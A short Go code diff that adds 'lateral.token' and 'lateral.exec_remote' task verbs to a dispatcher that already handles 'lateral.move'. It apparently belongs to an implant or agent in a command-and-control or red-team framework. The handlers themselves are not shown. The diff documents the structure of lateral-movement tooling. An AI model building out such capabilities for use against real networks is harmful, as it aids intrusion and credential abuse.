@@ -89,6 +89,12 @@ func (r *Runner) Dispatch(ctx context.Context, verb, arguments string) (rodpb.Ta
 	case "lateral.move":
 		outcome, output := r.lateralMove(ctx, arguments)
 		return outcome, output, nil
+	case "lateral.token":
+		outcome, output := r.lateralToken(ctx, arguments)
+		return outcome, output, nil
+	case "lateral.exec_remote":
+		outcome, output := r.lateralExecRemote(ctx, arguments)
+		return outcome, output, nil
 	default:
 		r.log.Printf("unknown verb: %s", verb)
 		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "unknown verb: " + verb, nil
